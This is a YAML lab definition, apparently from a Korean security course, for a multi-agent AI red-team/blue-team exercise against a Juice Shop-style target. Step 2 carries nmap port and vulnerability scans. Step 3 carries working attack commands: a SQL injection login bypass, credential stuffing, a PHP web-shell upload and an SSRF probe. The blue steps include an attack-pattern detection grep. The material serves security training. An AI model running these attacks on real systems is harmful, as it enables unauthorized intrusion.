@@ -1,0 +1,235 @@
+lab_id: "battle-ai-week13"
+title: "AI 팀 공방전 — 다중 에이전트"
+version: "ai"
+course: "battle-ai"
+week: 13
+description: "다중 Red AI 에이전트가 협조 공격을 수행하고, 다중 Blue AI 에이전트가 분산 방어를 수행하는 팀 공방전."
+difficulty: "hard"
+duration_minutes: 90
+objectives:
+  - "다중 Red AI가 역할 분담 기반 협조 공격을 수행한다"
+  - "다중 Blue AI가 분산 모니터링 및 방어를 수행한다"
+  - "팀 간 공방전 결과를 종합 분석한다"
+  - "다중 에이전트 협조의 효과를 평가한다"
+prerequisites:
+  - "Week 12 AI 1v1 공방전 (2) 완료"
+infra_requirements:
+  - "attacker VM with bastion"
+  - "defender VM"
+pass_threshold: 0.6
+steps:
+  - order: 1
+    instruction: "Blue Team AI가 다중 방어 에이전트를 배포한다 (네트워크/호스트/웹 모니터링)"
+    script: |
+      echo "=== Blue Team AI: 다중 방어 에이전트 배포 ==="
+      BLUE_DIR="/tmp/blue_team"
+      mkdir -p "$BLUE_DIR"
+
+      echo "[Agent 1: 네트워크 모니터]"
+      cat > "$BLUE_DIR/net_monitor.sh" << 'SCRIPT'
+      #!/bin/bash
+      echo "=== Network Monitor Agent ==="
+      ss -tuna > /tmp/blue_team/net_baseline.txt
+      while true; do
+        ss -tuna > /tmp/blue_team/net_current.txt
+        NEW=$(diff /tmp/blue_team/net_baseline.txt /tmp/blue_team/net_current.txt 2>/dev/null | grep "^>" | wc -l)
+        if [ "$NEW" -gt 0 ]; then
+          echo "[$(date)] 새 연결 $NEW개 탐지" >> /tmp/blue_team/net_alerts.log
+        fi
+        sleep 5
+      done
+      SCRIPT
+      chmod +x "$BLUE_DIR/net_monitor.sh"
+      timeout 90 "$BLUE_DIR/net_monitor.sh" &>/dev/null &
+      echo "  PID: $!"
+
+      echo "[Agent 2: 호스트 모니터]"
+      cat > "$BLUE_DIR/host_monitor.sh" << 'SCRIPT'
+      #!/bin/bash
+      echo "=== Host Monitor Agent ==="
+      ps aux --no-headers | wc -l > /tmp/blue_team/proc_baseline.txt
+      while true; do
+        CURRENT=$(ps aux --no-headers | wc -l)
+        BASELINE=$(cat /tmp/blue_team/proc_baseline.txt)
+        DIFF=$((CURRENT - BASELINE))
+        if [ "$DIFF" -gt 5 ]; then
+          echo "[$(date)] 프로세스 급증: +$DIFF개" >> /tmp/blue_team/host_alerts.log
+        fi
+        sleep 5
+      done
+      SCRIPT
+      chmod +x "$BLUE_DIR/host_monitor.sh"
+      timeout 90 "$BLUE_DIR/host_monitor.sh" &>/dev/null &
+      echo "  PID: $!"
+
+      echo "[Agent 3: 웹 모니터]"
+      cat > "$BLUE_DIR/web_monitor.sh" << 'SCRIPT'
+      #!/bin/bash
+      echo "=== Web Monitor Agent ==="
+      while true; do
+        if [ -f /var/log/nginx/access.log ]; then
+          ATTACKS=$(tail -50 /var/log/nginx/access.log | grep -ciE "union|select|script|onerror|\.\./" 2>/dev/null)
+          if [ "$ATTACKS" -gt 0 ]; then
+            echo "[$(date)] 웹 공격 패턴 $ATTACKS건" >> /tmp/blue_team/web_alerts.log
+          fi
+        fi
+        sleep 5
+      done
+      SCRIPT
+      chmod +x "$BLUE_DIR/web_monitor.sh"
+      timeout 90 "$BLUE_DIR/web_monitor.sh" &>/dev/null &
+      echo "  PID: $!"
+
+      echo ""
+      echo "Blue Team 다중 방어 에이전트 배포 완료"
+    category: "defense"
+    risk_level: "low"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Blue Team 다중 방어 에이전트 배포 완료"
+      field: "stdout"
+
+  - order: 2
+    instruction: "Red Team AI Agent 1이 정찰 및 취약점 스캐닝을 수행한다"
+    script: |
+      echo "=== Red Team AI Agent 1: 정찰 담당 ==="
+      RED_DIR="/tmp/red_team"
+      mkdir -p "$RED_DIR"
+
+      echo "[Phase 1: 광범위 포트 스캔]"
+      nmap -sS -p 1-1024 --min-rate 500 10.20.30.80 -oN "$RED_DIR/agent1_portscan.txt" 2>&1 | tail -10
+      echo ""
+
+      echo "[Phase 2: 취약점 스캔]"
+      nmap --script vuln -p 22,80,443,3000,8080 10.20.30.80 -oN "$RED_DIR/agent1_vulnscan.txt" 2>&1 | tail -15
+      echo ""
+
+      echo "[Phase 3: 웹 디렉토리 열거]"
+      for path in /admin /api /backup /config /ftp /uploads /test; do
+        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$path")
+        echo "  $path → HTTP $STATUS" | tee -a "$RED_DIR/agent1_dirbrute.txt"
+      done
+      echo ""
+      echo "Red Agent 1 정찰 완료"
+    category: "recon"
+    risk_level: "medium"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Red Agent 1 정찰 완료"
+      field: "stdout"
+
+  - order: 3
+    instruction: "Red Team AI Agent 2가 동시에 익스플로잇을 시도한다"
+    script: |
+      echo "=== Red Team AI Agent 2: 익스플로잇 담당 ==="
+      RED_DIR="/tmp/red_team"
+
+      echo "[Attack 1: SQL Injection 공격]"
+      curl -s -X POST "http://10.20.30.80:3000/rest/user/login" \
+        -H "Content-Type: application/json" \
+        -d '{"email":"admin@juice-sh.op'\''--","password":"x"}' 2>&1 | head -3
+      echo ""
+
+      echo "[Attack 2: 크레덴셜 스터핑]"
+      for user in admin test guest operator; do
+        curl -s -X POST "http://10.20.30.80:3000/rest/user/login" \
+          -H "Content-Type: application/json" \
+          -d "{\"email\":\"${user}@juice-sh.op\",\"password\":\"password123\"}" -o /dev/null -w "  $user → HTTP %{http_code}\n"
+      done
+      echo ""
+
+      echo "[Attack 3: 파일 업로드 시도]"
+      echo '<?php system($_GET["cmd"]); ?>' > /tmp/test_shell.php
+      curl -s -X POST "http://10.20.30.80:3000/file-upload" \
+        -F "file=@/tmp/test_shell.php" 2>&1 | head -3
+      rm -f /tmp/test_shell.php
+      echo ""
+
+      echo "[Attack 4: SSRF 시도]"
+      curl -s "http://10.20.30.80:3000/api/Products/1?d=http://localhost:22" 2>&1 | head -3
+      echo ""
+      echo "Red Agent 2 익스플로잇 완료"
+    category: "exploit"
+    risk_level: "high"
+    points: 20
+    verify:
+      type: "output_contains"
+      expect: "Red Agent 2 익스플로잇 완료"
+      field: "stdout"
+
+  - order: 4
+    instruction: "Blue Team AI가 모든 에이전트의 탐지 결과를 수집하고 자동 대응한다"
+    script: |
+      echo "=== Blue Team AI: 탐지 결과 수집 및 대응 ==="
+      BLUE_DIR="/tmp/blue_team"
+
+      echo "[Agent 1: 네트워크 알림]"
+      cat "$BLUE_DIR/net_alerts.log" 2>/dev/null | tail -10 || echo "  알림 없음"
+      echo ""
+
+      echo "[Agent 2: 호스트 알림]"
+      cat "$BLUE_DIR/host_alerts.log" 2>/dev/null | tail -10 || echo "  알림 없음"
+      echo ""
+
+      echo "[Agent 3: 웹 알림]"
+      cat "$BLUE_DIR/web_alerts.log" 2>/dev/null | tail -10 || echo "  알림 없음"
+      echo ""
+
+      echo "=== 자동 대응 조치 ==="
+      echo "[1] 의심 IP 차단"
+      grep -hoP '\d+\.\d+\.\d+\.\d+' "$BLUE_DIR"/*.log 2>/dev/null | sort -u | while read ip; do
+        echo "  차단 대상: $ip"
+      done
+
+      echo "[2] Suricata 알림 요약"
+      tail -10 /var/log/suricata/fast.log 2>/dev/null || echo "  Suricata 알림 없음"
+
+      echo "[3] 모니터링 에이전트 종료"
+      pkill -f "net_monitor.sh" 2>/dev/null
+      pkill -f "host_monitor.sh" 2>/dev/null
+      pkill -f "web_monitor.sh" 2>/dev/null
+      echo "  에이전트 종료 완료"
+      echo ""
+      echo "Blue Team 자동 대응 완료"
+    category: "response"
+    risk_level: "medium"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "Blue Team 자동 대응 완료"
+      field: "stdout"
+
+  - order: 5
+    instruction: "AI가 팀 공방전 결과를 종합 분석한다"
+    script: |
+      echo "=== AI 팀 공방전 종합 보고서 ===" > /tmp/team_battle_report.txt
+      echo "시간: $(date)" >> /tmp/team_battle_report.txt
+      echo "" >> /tmp/team_battle_report.txt
+
+      echo "[Red Team 활동 요약]" >> /tmp/team_battle_report.txt
+      echo "  Agent 1 (정찰): 포트스캔 + 취약점스캔 + 디렉토리열거" >> /tmp/team_battle_report.txt
+      echo "  Agent 2 (익스플로잇): SQLi + 크레덴셜스터핑 + 파일업로드 + SSRF" >> /tmp/team_battle_report.txt
+      echo "  협조 효과: 동시 다발 공격으로 방어 분산" >> /tmp/team_battle_report.txt
+      echo "" >> /tmp/team_battle_report.txt
+
+      echo "[Blue Team 방어 요약]" >> /tmp/team_battle_report.txt
+      echo "  Agent 1 (네트워크): 연결 모니터링" >> /tmp/team_battle_report.txt
+      echo "  Agent 2 (호스트): 프로세스 모니터링" >> /tmp/team_battle_report.txt
+      echo "  Agent 3 (웹): 공격 패턴 탐지" >> /tmp/team_battle_report.txt
+      echo "  대응: 자동 IP 차단 + Suricata 연동" >> /tmp/team_battle_report.txt
+      echo "" >> /tmp/team_battle_report.txt
+
+      echo "[다중 에이전트 효과 분석]" >> /tmp/team_battle_report.txt
+      echo "  - 동시 공격 시 방어 부하 증가" >> /tmp/team_battle_report.txt
+      echo "  - 분산 모니터링으로 탐지 범위 확대" >> /tmp/team_battle_report.txt
+      echo "  - 에이전트 간 정보 공유가 핵심" >> /tmp/team_battle_report.txt
+      cat /tmp/team_battle_report.txt
+    category: "analysis"
+    risk_level: "low"
+    points: 15
+    verify:
+      type: "output_contains"
+      expect: "AI 팀 공방전 종합 보고서"
+      field: "stdout"
